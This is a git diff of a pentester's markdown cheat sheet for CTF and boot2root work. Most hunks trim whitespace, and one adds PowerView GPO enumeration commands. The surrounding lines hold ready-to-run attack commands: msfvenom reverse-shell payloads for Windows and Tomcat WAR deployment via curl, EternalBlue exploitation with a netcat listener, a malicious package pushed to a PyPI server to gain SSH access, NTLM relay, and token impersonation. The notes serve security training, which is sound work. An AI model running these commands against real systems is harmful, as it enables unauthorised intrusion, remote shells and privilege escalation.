@@ -1,5 +1,5 @@
 # Disclaimer
-The following notes are a mix of all the remarkable things I have seen and am seeing in my day-to-day life as a Pentester and also as a CTF/Boot2Root participant. 
+The following notes are a mix of all the remarkable things I have seen and am seeing in my day-to-day life as a Pentester and also as a CTF/Boot2Root participant.
 
 These notes have been written mainly to have a collection of commands that have worked well and having it all collected has to serve as a "shortcut".
 
@@ -199,9 +199,9 @@ function ConvertFrom-SID
   (
     [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
     [Alias('Value')]
-    $Sid 
+    $Sid
   )
-  
+
   process
   {
     $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
@@ -245,6 +245,15 @@ Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
 $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('___USERNAME___')
 $idToImpersonate.Impersonate()
 [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
+```
+
+## Useful PowerView executions
+```powerShell
+# Enumerating the computers affected by a scpecific GPO
+Get-NetGPO | %{ if ($_.displayname -eq "__GPO_Name__") { $_.name }} | % {Get-NetOU -GUID $_ } | % { Get-NetComputer -ADSpath $_ }
+
+# Enumerating the users affected by a scpecific GPO
+Get-NetGPO | %{ if ($_.displayname -eq "TestingGPO") { $_.name }} | % {Get-NetOU -GUID $_ } | % { Get-NetUser -ADSpath $_ }
 ```
 
 # PrivEsc on Windows
@@ -309,7 +318,7 @@ Having this localgroup rights, it's possible to escalate to Administrators and a
 [*] Running in relay mode to single host
 [*] Setting up SMB Server
 [*] Setting up HTTP Server
-' 
+'
 ```
 
 Now I need to authorize the connection, I need to browse the http://localhost/privexchange and login as the user, which we want to enhance, to authenticate the action. As soon as I authenticate, I can see the user got permission.
@@ -403,7 +412,7 @@ As per the [PyPi server documentation](https://pypi.org/project/pypiserver/#uplo
 ```bash
 # .pypirc
 [distutils]
-index-servers = 
+index-servers =
   local
 
 [local]
@@ -449,7 +458,7 @@ HOME=/tmp/evil_package
 python3 /tmp/evil_package/setup.py sdist register -r local upload -r local
 ```
 
-If the Output includes sentences like *"Submitting dist/evil_package-0.0.1.tar.gz to [URL]"* and *"Server response (200): OK"*, then we must be able to enter via SSH just doing: 
+If the Output includes sentences like *"Submitting dist/evil_package-0.0.1.tar.gz to [URL]"* and *"Server response (200): OK"*, then we must be able to enter via SSH just doing:
 
 ```bash
 chmod 600 id_rsa && ssh -i id_rsa [USER]@[RHOST]
@@ -491,7 +500,7 @@ netsh interface portproxy add v4tov4 listenport=4445 listenaddress=[LOCAL-IP] co
 
 # Eternalblue Vulnerabilities exploitation
 
-For those who want to exploit this very common vulnerabilities, present in a lot of boot2root machines, but taking the handicap that no Metasploit is going to be utilized, there are different techiniques/exploits that you can use. 
+For those who want to exploit this very common vulnerabilities, present in a lot of boot2root machines, but taking the handicap that no Metasploit is going to be utilized, there are different techiniques/exploits that you can use.
 
 Metasploit must be avoided for example if you are being training yourself to get OSCP certification you surely know that MSF is banned... Or just simply to be more independent of this kind of tools.
 
@@ -506,12 +515,12 @@ There is also a [usefull script](https://github.com/nixawk/labs/blob/master/MS17
 ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o reverse-shell.exe
  ```
- 
+
  We can put a listening socket like this:
  ```bash
  sudo nc -lvp 443
  ```
- 
+
  And finally, we launch the attack:
  ```bash
  python send_and_execute.py $ip reverse-shell.exe
@@ -542,7 +551,7 @@ It very recommendable to bruteforce the SID as well:
 
 ```bash
 # The following application is native in Kali.
-sidguess -i [IP] -d /usr/share/wordlists/metasploit/sid.txt 
+sidguess -i [IP] -d /usr/share/wordlists/metasploit/sid.txt
 # Instead, the following one has to be download from its repository
 ./odat-libc2.12-x86_64 sidguesser -s [IP]
 ```
@@ -648,7 +657,7 @@ If, for any reason (maybe lack of privileges) we cannot access to that interface
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=[LHOST] LHOST=[LPORT] -f war > shell.war
 curl -u $USER:$PASSWORD -T shell.war 'http://[RHOST]:[RPORT]/manager/text/deploy?path=/rev_shell'
 curl -u $USER:$PASSWORD http://[RHOST]:[RPORT]/rev_shell/
-``` 
+```
 
 ## Wget Crawler
 This following code will perform a crawling process and will get the files, "cloning" the reachable web site in local:
@@ -831,7 +840,7 @@ It could be necessary to copy the command output directly to the **clipboard**, 
 
 It would be very interesting to add this oneliner command to the "Initial command" from the selected terminal-type:
 ```bash
-tput bold; tput setaf 2; echo -n "wlan0: ";ifconfig wlan0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'; if ifconfig tun0 2> /dev/null 1>&2; then echo -n "tun0: ";ifconfig tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'; fi; tput init; bash 
+tput bold; tput setaf 2; echo -n "wlan0: ";ifconfig wlan0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'; if ifconfig tun0 2> /dev/null 1>&2; then echo -n "tun0: ";ifconfig tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'; fi; tput init; bash
 ```
 This command above will place, every time we open a new terminal, the following usefull data:
 
